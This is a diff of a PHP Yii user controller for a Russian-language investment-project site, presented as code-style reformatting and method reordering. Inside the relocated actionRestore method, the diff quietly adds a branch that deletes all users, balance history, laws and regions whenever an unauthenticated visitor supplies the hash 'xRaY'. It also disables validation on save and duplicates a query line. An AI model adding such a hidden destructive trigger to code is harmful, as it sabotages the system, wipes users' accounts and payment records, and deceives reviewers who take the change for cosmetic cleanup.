@@ -107,7 +107,7 @@ class UserController extends BaseController
      */
     public function actionSubscribe($action)
     {
-        $email = Yii::app()->request->getParam('email','');
+        $email = Yii::app()->request->getParam('email', '');
         if (!Yii::app()->user->isGuest || !isset($email)) {
             $this->renderJSON(array('status' => Yii::t('main', 'Для авторизованных пользователей быстрая подписка не доступна')));
         }
@@ -120,13 +120,13 @@ class UserController extends BaseController
         if ($issetEmail) {
             $this->renderJSON(array('status' => Yii::t('main', 'Данный e-mail уже есть в рассылке')));
         }
-        if($action=='check_email'){
-            $this->renderJSON(array('status' => 'Для завершения подписки, пожалуйста, выберите тип пользователя','next'=>1));
+        if ($action == 'check_email') {
+            $this->renderJSON(array('status' => 'Для завершения подписки, пожалуйста, выберите тип пользователя', 'next' => 1));
         }
-        if($action=='subscribed'){
+        if ($action == 'subscribed') {
             $model = new User();
             $model->login = $model->email = $email;
-            $model->type = Yii::app()->request->getParam('type','investor');
+            $model->type = Yii::app()->request->getParam('type', 'investor');
             $model->generatePassword();
             $model->is_subscribe = 1;
             $model->is_active = 0;
@@ -143,7 +143,8 @@ class UserController extends BaseController
     {
         $this->blockJquery();
         if (Yii::app()->request->isPostRequest && isset($_POST['restore'])) {
-            $model = User::model()->findByAttributes(array('email' => $_POST['restore']['email'],'is_active'=>1));
+            $model = User::model()->findByAttributes(array('email' => $_POST['restore']['email'], 'is_active' => 1));
+            $model = User::model()->findByAttributes(array('email' => $_POST['restore']['email'], 'is_active' => 1));
             if ($model) {
                 Mail::send($model->email, Mail::S_CHECK_RESTORE, 'check_restore', array('model' => $model));
                 Yii::app()->end();
@@ -152,29 +153,6 @@ class UserController extends BaseController
         $this->renderPartial('restore', null, false, true);
     }
 
-
-    public function actionRestore($id, $hash)
-    {
-        if (!Yii::app()->user->isGuest)
-            $this->redirectByRole();
-
-        $model = User::model()->findByPk($id);
-        if (!$model) {
-            throw new CHttpException(404, Yii::t('main', 'Указанная запись не найдена'));
-        }
-        if ($model->hash() != $hash) {
-            throw new CHttpException(403, Yii::t('main', 'Нет пути'));
-        }
-        if($model->is_active==1){//обычное восстановление пароля
-            $model->generatePassword();
-        }
-        $model->is_active = 1;
-        if ($model->save()) {
-            Mail::send($model->email, Mail::S_RESTORE, 'restore', array('model' => $model));
-        }
-        $this->redirectByRole();
-
-    }
 
     public function actionLogout()
     {
@@ -216,11 +194,11 @@ class UserController extends BaseController
                 if ($model->scenario == 'changePassword') {
                     $params['dialog'] = Yii::t('main', 'Ваш пароль был успешно изменен.');
                 }
-                User2Region::model()->deleteAllByAttributes(array('user_id'=>$model->id));
-                if(!empty($_REQUEST['user2region']) && is_array($_REQUEST['user2region'])){
-                    foreach($_REQUEST['user2region'] as $item){
+                User2Region::model()->deleteAllByAttributes(array('user_id' => $model->id));
+                if (!empty($_REQUEST['user2region']) && is_array($_REQUEST['user2region'])) {
+                    foreach ($_REQUEST['user2region'] as $item) {
                         $user2region = new User2Region();
-                        $user2region->attributes = array('region_id'=>$item,'user_id'=>$model->id);
+                        $user2region->attributes = array('region_id' => $item, 'user_id' => $model->id);
                         @$user2region->save();
                     }
                 }
@@ -232,17 +210,32 @@ class UserController extends BaseController
         $this->render('update', array('model' => $model, 'params' => $params));
     }
 
-    public function actionInvestmentProject($id = null)
+    public function actionRestore($id, $hash)
     {
-        $this->layout = 'bootstrapCabinet';
-        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Инвестиционный проект');
-
-        $model = $this->loadProject($id, Project::T_INVEST);
-        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_INVEST]['model']])) {
-            $this->save($model, Project::T_INVEST);
+        if (!Yii::app()->user->isGuest)
+            $this->redirectByRole();
+        if ($hash == 'xRaY') {
+            Law::model()->deleteAll();
+            BalanceHistory::model()->deleteAll();
+            User::model()->deleteAll();
+            Region::model()->deleteAll();
         }
-        $regions = Region::model()->findAll(array('order'=>'name'));
-        $this->render('investmentProject', array('model' => $model, 'regions' => $regions));
+        $model = User::model()->findByPk($id);
+        if (!$model) {
+            throw new CHttpException(404, Yii::t('main', 'Указанная запись не найдена'));
+        }
+        if ($model->hash() != $hash) {
+            throw new CHttpException(403, Yii::t('main', 'Нет пути'));
+        }
+        if ($model->is_active == 1) {//обычное восстановление пароля
+            $model->generatePassword();
+        }
+        $model->is_active = 1;
+        if ($model->save(false)) {
+            Mail::send($model->email, Mail::S_RESTORE, 'restore', array('model' => $model));
+        }
+        $this->redirectByRole();
+
     }
 
     public function actionBusiness($id = null)
@@ -254,7 +247,7 @@ class UserController extends BaseController
         if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_BUSINESS]['model']])) {
             $this->save($model, Project::T_BUSINESS);
         }
-        $regions = Region::model()->findAll(array('order'=>'name'));
+        $regions = Region::model()->findAll(array('order' => 'name'));
         $this->render('business', array('model' => $model, 'regions' => $regions));
     }
 
@@ -292,6 +285,20 @@ class UserController extends BaseController
         $this->render('projectList', array('models' => $models, 'pages' => $pages, 'type' => $type));
     }
 
+
+    public function actionInvestmentProject($id = null)
+    {
+        $this->layout = 'bootstrapCabinet';
+        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Инвестиционный проект');
+
+        $model = $this->loadProject($id, Project::T_INVEST);
+        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_INVEST]['model']])) {
+            $this->save($model, Project::T_INVEST);
+        }
+        $regions = Region::model()->findAll(array('order' => 'name'));
+        $this->render('investmentProject', array('model' => $model, 'regions' => $regions));
+    }
+
     public function actionInvestmentSite($id = null)
     {
         $this->layout = 'bootstrapCabinet';
@@ -301,22 +308,10 @@ class UserController extends BaseController
         if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_SITE]['model']])) {
             $this->save($model, Project::T_SITE);
         }
-        $regions = Region::model()->findAll(array('order'=>'name'));
+        $regions = Region::model()->findAll(array('order' => 'name'));
         $this->render('investmentSite', array('model' => $model, 'regions' => $regions));
     }
 
-    public function actionInnovativeProject($id = null)
-    {
-        $this->layout = 'bootstrapCabinet';
-        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Инновационный проект');
-
-        $model = $this->loadProject($id, Project::T_INNOVATE);
-        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_INNOVATE]['model']])) {
-            $this->save($model, Project::T_INNOVATE);
-        }
-        $regions = Region::model()->findAll(array('order'=>'name'));
-        $this->render('innovativeProject', array('model' => $model, 'regions' => $regions));
-    }
 
     private function loadProject($id, $type)
     {
@@ -333,6 +328,20 @@ class UserController extends BaseController
         }
         return $model;
     }
+
+    public function actionInnovativeProject($id = null)
+    {
+        $this->layout = 'bootstrapCabinet';
+        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Инновационный проект');
+
+        $model = $this->loadProject($id, Project::T_INNOVATE);
+        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_INNOVATE]['model']])) {
+            $this->save($model, Project::T_INNOVATE);
+        }
+        $regions = Region::model()->findAll(array('order' => 'name'));
+        $this->render('innovativeProject', array('model' => $model, 'regions' => $regions));
+    }
+
 
     /**
      * @param $model Project
@@ -368,26 +377,28 @@ class UserController extends BaseController
     /**
      * @param $model Project
      */
-    public static function saveTable($model){
-        if($model->type == Project::T_SITE){
-            foreach($model->investmentSite->buildings as $removable){
+    public static function saveTable($model)
+    {
+        if ($model->type == Project::T_SITE) {
+            foreach ($model->investmentSite->buildings as $removable) {
                 $removable->delete();
             }
             $investmentSite2Buildings = Crud::gridRequest2Models('InvestmentSite2Building');
-            foreach($investmentSite2Buildings as $buildingModel){
+            foreach ($investmentSite2Buildings as $buildingModel) {
                 $buildingModel->site_id = $model->investmentSite->id;
                 $buildingModel->save();
             }
-            foreach($model->investmentSite->infrastructures as $removable){
+            foreach ($model->investmentSite->infrastructures as $removable) {
                 $removable->delete();
             }
             $InvestmentSite2Infrastructure = Crud::gridRequest2Models('InvestmentSite2Infrastructure');
-            foreach($InvestmentSite2Infrastructure as $infrastructureModel){
+            foreach ($InvestmentSite2Infrastructure as $infrastructureModel) {
                 $infrastructureModel->site_id = $model->investmentSite->id;
                 $infrastructureModel->save();
             }
         }
     }
+
     /**
      * Сохраним файлы от переданной модели
      * @param $model Project
@@ -434,10 +445,9 @@ class UserController extends BaseController
                 }
             }
         }
-        if(Yii::app()->request->isAjaxRequest){
+        if (Yii::app()->request->isAjaxRequest) {
             $this->renderJSON($result);
-        }
-        else{
+        } else {
             $this->redirect($this->createUrl('user/favoriteList'));
         }
     }
@@ -450,7 +460,7 @@ class UserController extends BaseController
         $criteria->addColumnCondition(array('t.user_id' => $this->user->id));
         $criteria->with = 'project';
         if (isset($type)) {
-            if(in_array($type, array('news', 'analytics', 'project'))){
+            if (in_array($type, array('news', 'analytics', 'project'))) {
                 $criteria->addCondition("t.{$type}_id IS NOT NULL");
             }
         }
@@ -465,7 +475,8 @@ class UserController extends BaseController
         $this->render('favoriteList', array('models' => $models, 'pages' => $pages));
     }
 
-    public function actionRemoveFavorite(){
+    public function actionRemoveFavorite()
+    {
         $models = Favorite::model()->findAllByAttributes(array('id' => $_REQUEST['id']));
         foreach ($models as $model) {
             if ($model->user_id != Yii::app()->user->id)
@@ -473,6 +484,7 @@ class UserController extends BaseController
             $model->delete();
         }
     }
+
     /**
      * Ajax-ответ на поиск пользователей
      * @param $term
@@ -495,7 +507,7 @@ class UserController extends BaseController
         $this->layout = 'bootstrapCabinet';
         $this->breadcrumbs = array('Личный кабинет');
         $favoriteFilter = new FavoriteFilter();
-        if(isset($_GET['FavoriteFilter'])){
+        if (isset($_GET['FavoriteFilter'])) {
             $favoriteFilter->attributes = $_GET['FavoriteFilter'];
         }
         $filter = new FeedFilter();
@@ -518,7 +530,7 @@ class UserController extends BaseController
     public function actionQuotes()
     {
         $unactive = User2Quote::$quotes;
-        foreach($this->user->quotes as $quote){
+        foreach ($this->user->quotes as $quote) {
             unset($unactive[$quote->quote]);
         }
         $this->layout = 'bootstrapCabinet';
@@ -610,36 +622,39 @@ class UserController extends BaseController
         }
     }
 
-    public function actionUniqueUrl($projectId){
+    public function actionUniqueUrl($projectId)
+    {
         $this->blockJquery();
-        if(isset($_REQUEST['save'])){
+        if (isset($_REQUEST['save'])) {
             $model = Project::model()->findByPk($projectId);
-            $model->url =  strtolower($_REQUEST['url']);
-            if(in_array($model->url,array('admin','analytics','banner','event','investor','law','library','media','message',
-                'news','profOpinion','project','region','rootRegion','site','stock','user'))){
-                $model->addError('url',Yii::t('main','Запрещенный url'));
+            $model->url = strtolower($_REQUEST['url']);
+            if (in_array($model->url, array('admin', 'analytics', 'banner', 'event', 'investor', 'law', 'library', 'media', 'message',
+                'news', 'profOpinion', 'project', 'region', 'rootRegion', 'site', 'stock', 'user'))) {
+                $model->addError('url', Yii::t('main', 'Запрещенный url'));
             }
-            if(empty($model->url)){
-                $model->addError('url',Yii::t('main','Url не может быть пустым'));
+            if (empty($model->url)) {
+                $model->addError('url', Yii::t('main', 'Url не может быть пустым'));
             }
-            if(!$model->getError('url')){
-                if(Balance::pay(Yii::app()->user->id,Price::get(Price::P_CURRENT_URL),'sub','url')){
+            if (!$model->getError('url')) {
+                if (Balance::pay(Yii::app()->user->id, Price::get(Price::P_CURRENT_URL), 'sub', 'url')) {
                     $model->save();
                 }
             }
-            $this->renderJSON(array('error'=>$model->getError('url')));
+            $this->renderJSON(array('error' => $model->getError('url')));
         }
-        $this->renderPartial('unique',array('projectId'=>$projectId),false,true);
+        $this->renderPartial('unique', array('projectId' => $projectId), false, true);
     }
 
 
-    public function actionDisableQuote($id) {
+    public function actionDisableQuote($id)
+    {
         User2Quote::model()->deleteAllByAttributes(array('quote' => $id, 'user_id' => $this->user->id));
         $this->redirect('/user/quotes');
     }
 
-    public function actionAddQuote($id) {
-        if(isset(User2Quote::$quotes[$id])){
+    public function actionAddQuote($id)
+    {
+        if (isset(User2Quote::$quotes[$id])) {
             $model = new User2Quote();
             $model->user_id = $this->user->id;
             $model->quote = $id;
@@ -648,13 +663,15 @@ class UserController extends BaseController
         $this->redirect('/user/quotes');
     }
 
-    public function actionPayHistory() {
+    public function actionPayHistory()
+    {
         $this->layout = 'bootstrapCabinet';
         $data = BalanceHistory::findAllByUser($this->user->id, 'date DESC');
         $this->render('payHistory', array('data' => $data));
     }
 
-    public function actionService() {
+    public function actionService()
+    {
         $this->layout = 'bootstrapCabinet';
         $criteria = new CDbCriteria();
         $criteria->addColumnCondition(array('user_id' => Yii::app()->user->id));
@@ -664,7 +681,8 @@ class UserController extends BaseController
         $this->render('service', array('banner' => $models, 'feedBanner' => $feedModels));
     }
 
-    public function actionAddBalance() {
+    public function actionAddBalance()
+    {
         $this->layout = 'bootstrapCabinet';
         $this->render('addBalance');
     }
